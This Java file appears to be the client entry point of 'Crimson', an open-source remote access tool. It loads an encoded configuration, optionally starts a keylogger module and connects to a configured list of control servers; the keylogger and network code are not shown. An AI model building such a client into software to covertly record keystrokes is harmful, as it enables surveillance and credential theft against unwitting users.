/******************************************************************************
 *                                                                            *
 *                    Copyright 2016 Subterranean Security                    *
 *                                                                            *
 *  Licensed under the Apache License, Version 2.0 (the "License");           *
 *  you may not use this file except in compliance with the License.          *
 *  You may obtain a copy of the License at                                   *
 *                                                                            *
 *      http://www.apache.org/licenses/LICENSE-2.0                            *
 *                                                                            *
 *  Unless required by applicable law or agreed to in writing, software       *
 *  distributed under the License is distributed on an "AS IS" BASIS,         *
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
 *  See the License for the specific language governing permissions and       *
 *  limitations under the License.                                            *
 *                                                                            *
 *****************************************************************************/
package com.subterranean_security.crimson.client;

import java.awt.HeadlessException;
import java.io.File;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.subterranean_security.crimson.client.modules.Keylogger;
import com.subterranean_security.crimson.core.Common;
import com.subterranean_security.crimson.core.misc.AuthenticationGroup;
import com.subterranean_security.crimson.core.misc.EH;
import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
import com.subterranean_security.crimson.core.storage.ClientDB;
import com.subterranean_security.crimson.core.util.B64Util;
import com.subterranean_security.crimson.core.util.LogUtil;
import com.subterranean_security.crimson.core.util.Native;

public class Client {
	private static final Logger log = LoggerFactory.getLogger(Client.class);

	public static ClientDB clientDB;
	public static ClientConfig ic;

	public static void main(String[] args) {

		LogUtil.configure();

		log.info("Initializing client");

		// Establish the custom fallback exception handler
		Thread.setDefaultUncaughtExceptionHandler(new EH());

		// Establish the custom shutdown hook
		Runtime.getRuntime().addShutdownHook(new ShutdownHook());

		// Load native libraries
		Native.Loader.load();

		try {
			clientDB = new ClientDB(new File(Common.Directories.base + "/var/client.db"));
			ic = ClientConfig.parseFrom(B64Util.decode(clientDB.getString("ic")));
		} catch (Exception e) {
			// TODO: handle exception
			System.out.println("Database error");
		}

		try {
			Common.cvid = Client.clientDB.getInteger("cvid");
		} catch (Exception e2) {
		}

		log.debug("CVID: {}", Common.cvid);

		if (ic.getKeylogger()) {
			try {
				Keylogger.start(ic.getKeyloggerFlushMethod(), ic.getKeyloggerFlushValue());
			} catch (HeadlessException e) {
				// ignore
			} catch (Exception e) {
				log.error("Failed to start keylogger: {}", e.getMessage());
			}
		}

		ClientStore.Connections.setTargets(ic.getTargetList());
		ClientStore.Connections.connectionRoutine();

	}

	public static void saveIC() {
		clientDB.storeObject("ic", new String(B64Util.encode(ic.toByteArray())));
	}

	public static AuthenticationGroup getGroup() {
		try {
			return (AuthenticationGroup) clientDB.getObject("auth.group");
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return null;
	}

}
